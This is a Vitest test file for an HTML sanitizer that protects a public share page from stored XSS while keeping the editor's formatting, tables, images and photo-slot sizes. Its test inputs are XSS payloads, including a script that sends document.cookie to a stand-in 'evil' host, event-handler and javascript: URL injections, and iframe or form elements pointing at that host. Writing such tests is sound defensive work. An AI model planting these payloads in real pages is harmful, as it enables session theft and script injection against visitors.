import { describe, it, expect } from "vitest";
import { sanitizePageHtml } from "../apps/api/src/domains/projects/sanitize-page-html";

/*
 * `project_pages.content_html` is only length-validated on write, and the
 * public share route injects it with `dangerouslySetInnerHTML` for anonymous
 * visitors. These are the payloads that route has to survive.
 */
describe("sanitizePageHtml — blocks stored XSS on the public share route", () => {
  it("removes script tags and their contents", () => {
    const out = sanitizePageHtml('<p>Hi</p><script>fetch("//evil/"+document.cookie)</script>');
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil");
    expect(out).toContain("<p>Hi</p>");
  });

  it("strips inline event handlers", () => {
    for (const payload of [
      '<img src="x" onerror="alert(1)">',
      '<p onmouseover="alert(1)">hover</p>',
      '<div onclick="alert(1)">click</div>',
      '<body onload="alert(1)">',
    ]) {
      const out = sanitizePageHtml(payload);
      expect(out.toLowerCase()).not.toMatch(/on(error|mouseover|click|load)\s*=/);
      expect(out).not.toContain("alert(1)");
    }
  });

  it("blocks javascript: and data: URLs on links", () => {
    expect(sanitizePageHtml('<a href="javascript:alert(1)">x</a>')).not.toContain("javascript:");
    expect(
      sanitizePageHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>'),
    ).not.toContain("data:text/html");
  });

  it("drops framing and plugin elements entirely", () => {
    for (const payload of [
      '<iframe src="//evil"></iframe>',
      '<object data="//evil"></object>',
      '<embed src="//evil">',
      '<form action="//evil"><input name="p"></form>',
    ]) {
      const out = sanitizePageHtml(payload);
      expect(out).not.toMatch(/<(iframe|object|embed|form|input)\b/i);
      expect(out).not.toContain("evil");
    }
  });

  it("neutralises svg/math-based mXSS vectors", () => {
    const out = sanitizePageHtml("<svg><script>alert(1)</script></svg><math><mi>x</mi></math>");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("<svg");
  });

  it("does not let a style block smuggle script", () => {
    const out = sanitizePageHtml(
      "<style>body{background:url('javascript:alert(1)')}</style><p>ok</p>",
    );
    expect(out).not.toContain("<style");
    expect(out).not.toContain("javascript:");
    expect(out).toContain("<p>ok</p>");
  });

  it("adds rel=noopener to links that open a new tab", () => {
    const out = sanitizePageHtml('<a href="https://example.com" target="_blank">x</a>');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
  });
});

describe("sanitizePageHtml — preserves legitimate document content", () => {
  it("keeps the editor's formatting tags", () => {
    const html =
      "<h2>Findings</h2><p><strong>Roof</strong> shows <em>wear</em>.</p>" +
      "<ul><li>Item one</li><li>Item two</li></ul><blockquote>Note</blockquote>";
    expect(sanitizePageHtml(html)).toBe(html);
  });

  it("keeps tables with their spans", () => {
    const html =
      '<table><tbody><tr><th colspan="2">Area</th></tr><tr><td>Roof</td><td>OK</td></tr></tbody></table>';
    expect(sanitizePageHtml(html)).toBe(html);
  });

  it("keeps images, including resolved signed URLs and inline data URIs", () => {
    expect(sanitizePageHtml('<img src="https://cdn.example.com/a.jpg" alt="Roof">')).toContain(
      "https://cdn.example.com/a.jpg",
    );
    // An SVG delivered through <img> cannot execute script, so data: stays
    // allowed for images — generated documents rely on it.
    expect(sanitizePageHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')).toContain(
      "data:image/png",
    );
  });

  it("keeps class names and safe alignment styles the editor emits", () => {
    const html = '<p class="text-center" style="text-align:center">Centered</p>';
    const out = sanitizePageHtml(html);
    expect(out).toContain('class="text-center"');
    expect(out).toContain("text-align:center");
  });

  it("passes through null and empty input untouched", () => {
    expect(sanitizePageHtml(null)).toBeNull();
    expect(sanitizePageHtml("")).toBe("");
  });

  /*
   * A photo slot declares a fixed box so a row of them lines up, and
   * ProjectImage.renderHTML serialises that box as an inline style because the
   * HTML `width`/`height` attributes lose to Tailwind's preflight
   * `img { height: auto }` on every surface that renders stored HTML.
   *
   * The shared page is one of those surfaces, and it renders THIS function's
   * output — so tightening `allowedStyles` would silently drop the box and put
   * photos back to their natural aspect for the customer, with the editor still
   * showing the authored layout. Measured before the fix: a slot declaring
   * 280px rendered 127px on the shared page.
   */
  it("keeps the inline box a photo slot needs to hold its shape", () => {
    const html =
      '<img src="https://cdn.example.com/a.jpg" width="48%" height="260"' +
      ' style="width:48%;height:260px" alt="Before">';
    const out = sanitizePageHtml(html);
    expect(out).toContain("width:48%");
    expect(out).toContain("height:260px");
  });
});
